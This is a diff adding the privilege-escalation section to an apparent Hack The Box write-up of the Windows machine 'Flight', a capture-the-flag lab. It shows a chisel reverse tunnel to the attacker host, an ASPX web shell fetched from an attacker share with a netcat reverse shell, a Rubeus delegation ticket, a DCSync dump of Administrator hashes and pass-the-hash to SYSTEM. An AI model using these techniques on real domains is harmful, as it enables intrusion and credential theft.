@@ -18,7 +18,10 @@
 	13. [Grabbing_CBum_Shell](#Grabbing_CBum_Shell)
 4. [Privilege-Escalation](#Privilege-Escalation)
 	1. [Development_Site_And_Chisel_Tunnel](#Development_Site_And_Chisel_Tunnel)
-
+	2. [Uploading_ASPX_Shell](#Uploading_ASPX_Shell)
+	3. [Got_iis_apppool\defaultapppool_Shell](#Got_iis_apppool%20defaultapppool_Shell)
+	4. [Rubeus_to_get_fake_delegation_ticket_for_machine_account](#Rubeus_to_get_fake_delegation_ticket_for_machine_account)
+	5. [Getting_Admin_Shell](#Getting_Admin_Shell)
 ### `Box-Info`
 ```
 Flight is a hard Windows machine that starts with a website with two different virtual hosts. One of them is vulnerable to LFI and allows an attacker to retrieve an NTLM hash. Once cracked, the obtained clear text password will be sprayed across a list of valid usernames to discover a password re-use scenario. Once the attacker has SMB access as the user `s.moon` he is able to write to a share that gets accessed by other users. Certain files can be used to steal the NTLMv2 hash of the users that access the share. Once the second hash is cracked the attacker will be able to write a reverse shell in a share that hosts the web files and gain a shell on the box as low privileged user. Having credentials for the user `c.bum`, it will be possible to gain a shell as this user, which will allow the attacker to write an `aspx` web shell on a web site that&amp;amp;amp;#039;s configured to listen only on localhost. Once the attacker has command execution as the Microsoft Virtual Account he is able to run Rubeus to get a ticket for the machine account that can be used to perform a DCSync attack ultimately obtaining the hashes for the Administrator user.
@@ -412,3 +415,231 @@ flight\c.bum
 ### Privilege-Escalation
 
 ##### Development_Site_And_Chisel_Tunnel
+
+```
+C:\inetpub\development\development>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1DF4-493D
+
+ Directory of C:\inetpub\development\development
+
+11/15/2024  05:13 AM    <DIR>          .
+11/15/2024  05:13 AM    <DIR>          ..
+04/16/2018  01:23 PM             9,371 contact.html
+11/15/2024  05:12 AM    <DIR>          css
+11/15/2024  05:12 AM    <DIR>          fonts
+11/15/2024  05:12 AM    <DIR>          img
+04/16/2018  01:23 PM            45,949 index.html
+11/15/2024  05:12 AM    <DIR>          js
+               3 File(s)         56,846 bytes
+               6 Dir(s)   5,117,255,680 bytes free
+```
+
+```
+C:\Windows\system32>netstat -ano | FINDSTR LISTENING
+netstat -ano | FINDSTR LISTENING
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4784
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4784
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       912
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2752
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       492
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1280
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1592
+  TCP    0.0.0.0:49675          0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:49676          0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       632
+  TCP    0.0.0.0:49692          0.0.0.0:0              LISTENING       2888
+  TCP    0.0.0.0:49703          0.0.0.0:0              LISTENING       2864
+  TCP    10.10.11.187:53        0.0.0.0:0              LISTENING       2888
+  TCP    10.10.11.187:139       0.0.0.0:0              LISTENING       4
+  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2888
+  TCP    [::]:80                [::]:0                 LISTENING       4784
+  TCP    [::]:88                [::]:0                 LISTENING       652
+  TCP    [::]:135               [::]:0                 LISTENING       912
+  TCP    [::]:389               [::]:0                 LISTENING       652
+  TCP    [::]:443               [::]:0                 LISTENING       4784
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:464               [::]:0                 LISTENING       652
+  TCP    [::]:593               [::]:0                 LISTENING       912
+  TCP    [::]:636               [::]:0                 LISTENING       652
+  TCP    [::]:3268              [::]:0                 LISTENING       652
+  TCP    [::]:3269              [::]:0                 LISTENING       652
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:8000              [::]:0                 LISTENING       4
+  TCP    [::]:9389              [::]:0                 LISTENING       2752
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49664             [::]:0                 LISTENING       492
+  TCP    [::]:49665             [::]:0                 LISTENING       1280
+  TCP    [::]:49666             [::]:0                 LISTENING       652
+  TCP    [::]:49668             [::]:0                 LISTENING       1592
+  TCP    [::]:49675             [::]:0                 LISTENING       652
+  TCP    [::]:49676             [::]:0                 LISTENING       652
+  TCP    [::]:49684             [::]:0                 LISTENING       632
+  TCP    [::]:49692             [::]:0                 LISTENING       2888
+  TCP    [::]:49703             [::]:0                 LISTENING       2864
+  TCP    [::1]:53               [::]:0                 LISTENING       2888
+  TCP    [dead:beef::250]:53    [::]:0                 LISTENING       2888
+  TCP    [dead:beef::4551:4028:2602:7a35]:53  [::]:0                 LISTENING       2888
+  TCP    [fe80::4551:4028:2602:7a35%6]:53  [::]:0                 LISTENING       2888
+```
+
+```
+On the target machine
+C:\ProgramData>.\chisel.exe client 10.10.14.5:8000 R:8001:127.0.0.1:8000
+
+On the Kali machine
+# chisel server --port 8000 --reverse
+2024/11/15 08:13:59 server: Reverse tunnelling enabled
+2024/11/15 08:13:59 server: Fingerprint eBwSpbBw5APasoq7KCsvzpgyZLYmBzUueI+B+JkhhZc=
+2024/11/15 08:13:59 server: Listening on http://0.0.0.0:8000
+2024/11/15 08:14:00 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
+2024/11/15 08:14:00 server: session#1: tun: proxy#R:8001=>8000: Listening
+
+```
+
+Accessing the site on `127.0.0.1:8001`
+![](Flight_Web1.png)
+
+##### Uploading_ASPX_Shell
+```
+C:\inetpub\development\development>whoami
+whoami
+flight\c.bum
+
+C:\inetpub\development\development>copy \\10.10.14.5\b\shell.aspx .
+copy \\10.10.14.5\b\shell.aspx .
+	1 file(s) copied.
+```
+
+##### Got_iis_apppool\defaultapppool_Shell
+Accessing `http://127.0.0.1:8001/shell.aspx` and running NetCat on port 5555 gets the shell
+```
+# nc -lvnp 4444      
+listening on [any] 4444 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.11.187] 50136
+Spawn Shell...
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
+```
+
+##### Rubeus_to_get_fake_delegation_ticket_for_machine_account
+Upload the Rubeus.exe at `C:\ProgramData\`
+```
+C:\ProgramData>.\Rubeus.exe tgtdeleg /nowrap
+.\Rubeus.exe tgtdeleg /nowrap
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.4.2 
+
+
+[*] Action: Request Fake Delegation TGT (current user)
+
+[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
+[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
+[+] Kerberos GSS-API initialization success!
+[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: 9ol5AJ28zr/ZlEuS9EuVkb8dh2YjjQOXvm2RoEpgqWw=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
+
+      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
+
+C:\ProgramData>
+
+```
+
+##### Getting_Admin_Shell
+Save the above Base64 in a file
+```
+# cat ticket.b64 | base64 -d > ticket.kirbi
+
+┌──(root㉿kali)-[/home/ringbuffer/Downloads/Flight.htb]
+└─# python kirbi2ccache.py ticket.kirbi ticket.ccache
+INFO:root:Parsing kirbi file /home/ringbuffer/Downloads/Flight.htb/ticket.kirbi
+INFO:root:Done!
+
+
+┌──(root㉿kali)-[/home/ringbuffer/Downloads/Flight.htb]
+└─# ntpdate -u flight.htb                                          
+2024-11-15 08:39:15.201841 (-0500) +421.079129 +/- 0.047413 flight.htb 10.10.11.187 s1 no-leap
+CLOCK: time stepped by 421.079129
+
+┌──(root㉿kali)-[/home/ringbuffer/Downloads/Flight.htb]
+└─# KRB5CCNAME=ticket.ccache python /usr/share/doc/python3-impacket/examples/secretsdump.py -k -no-pass g0.flight.htb -just-dc-user Administrator -target-ip 10.10.11.187
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322
+Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465
+Administrator:des-cbc-md5:c7754cb5498c2a2f
+[*] Cleaning up...
+
+┌──(root㉿kali)-[/home/ringbuffer/Downloads/Flight.htb]
+└─# impacket-psexec Administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on flight.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file WnDSKGBV.exe
+[*] Opening SVCManager on flight.htb.....
+[*] Creating service vMvZ on flight.htb.....
+[*] Starting service vMvZ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami  
+nt authority\system
+```
+
+Get your root flag.
